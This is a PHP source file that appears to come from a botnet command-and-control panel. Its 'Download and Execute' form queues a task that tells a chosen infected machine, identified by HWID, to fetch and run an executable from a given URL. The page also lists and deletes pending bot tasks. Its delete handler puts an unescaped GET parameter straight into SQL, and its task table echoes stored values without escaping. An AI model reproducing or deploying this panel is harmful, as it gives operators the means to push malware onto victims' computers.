<?php 
include('header.php');

?>
		<!--end content-->

		
		
		
		 
		 <div class="col-md-12">
               <div class="panel-default" style="background-image: linear-gradient(to bottom,#232323 0,#232323 100%);">
				<div class="panel-body table-bordered" style="font-size:14px; padding-left:40px;padding-right:40px;padding-bottom:25px;padding-top:25px;">
				<form method="POST">
				<h2>Download and Execute</h2>
								<div class="form-group" style="margin-top:10px;">
								    <label> URL File </label>
								  <input name="link_dir" type="link" class="form-control" placeholder="expamle : http://site.com/file.exe">
								</div>
								<div class="form-group" style="margin-top:10px;">
								<label> HWID </label>
								  <input name="hwid_bot" type="text" class="form-control" placeholder="HWID bot">
								</div>
	
								<button name="submit" type="submit" class="btn-blue"> Add Task  <span class="ion-android-add"></span></button>
								<button type="reset" class="btn-close"> Reset  <span class="ion-android-delete"></span></button>
							  </form>
				<?php
	mysqli_query($condb,"set character_set_server='utf8'"); 
	mysqli_query($condb,"SET NAMES 'utf8'");
			
		if(isset($_POST['submit'])){
			
			$link_dir = mysqli_real_escape_string($condb,$_POST['link_dir']);

			$hwid_bot = mysqli_real_escape_string($condb,$_POST['hwid_bot']);
			

			if(empty($link_dir) or empty($hwid_bot)){
				   
				echo "<div style='margin-top:10px;' class='text-center alert alert-danger' role='alert'><h4> Error input </h4></div>";
			    	
				 }else{
					$sql_check = "SELECT * FROM `tasks` WHERE `HWID`='$hwid_bot' AND `completed`=0";
					$query_check = mysqli_query($condb,$sql_check);
					$count_check = mysqli_num_rows($query_check);
                    if($count_check == 0){
						$sql = "INSERT INTO `tasks` (`HWID`, `link`, `completed`)  VALUES ('$hwid_bot' ,'$link_dir' , 0)";
						mysqli_query($condb,"set character_set_server='utf8'"); 
						mysqli_query($condb,"set names 'utf8'");
						mysqli_query($condb,$sql);	       
						
						echo "<div style='margin-top:10px;'  class='text-center alert alert-success' role='alert'><h4> Added successfully </h4></div>";

					}else{
						echo "<div style='margin-top:10px;' class='text-center alert alert-danger' role='alert'><h4> You have a Task not completed </h4></div>";

					}

						

				 
				 }
			
		} 

?>
				</div>
			</div>
		 <br />
		 <div class="table-responsive" style="background-image: linear-gradient(to bottom,#232323 0,#232323 100%);">
			   <table class="table table-bordered table-hover">
				 <tr>
				 <td class="col-md-2">HWID</td>
				 <td class="col-md-2">Link File</td>
				 <td class="col-md-2">completed</td>
				 <td class="col-md-2">Action</td>
				
				 </tr>
				 <?php
				         $querypost="SELECT * FROM tasks WHERE completed=0 ORDER BY Id_task DESC";
						 mysqli_query($condb,"set character_set_server='utf8'"); 
						 mysqli_query($condb,"SET NAMES 'utf8'");
						 $result=mysqli_query($condb,$querypost);
				 
				 
				 
						 while($rows=@mysqli_fetch_array($result))
							{
				 
							   echo'<tr>
							   <td class="col-md-2">'.$rows['HWID'].'</td>
							   <td class="col-md-2">'.$rows['link'].'</td>
							   <td class="col-md-2">'.$rows['completed'].'</td>
							   <td class="col-md-2" style="padding-bottom: 12px;"><a class="btn-delete" href="tasks.php?id='.$rows['HWID'].'"> Delete</a></td>
							     </tr>
				 
									 ';
						     }
				 
				 ?>


		</table>
		 
		 
		 </div>



		</div>
<?php
$id = @$_GET['id'];
    if(isset($id)){
		mysqli_query($condb,"DELETE FROM `tasks` WHERE `HWID`='$id'");
		echo '<meta http-equiv="refresh" content="1;url=tasks.php" />';
	}

?>
<?php include('footer.php');?>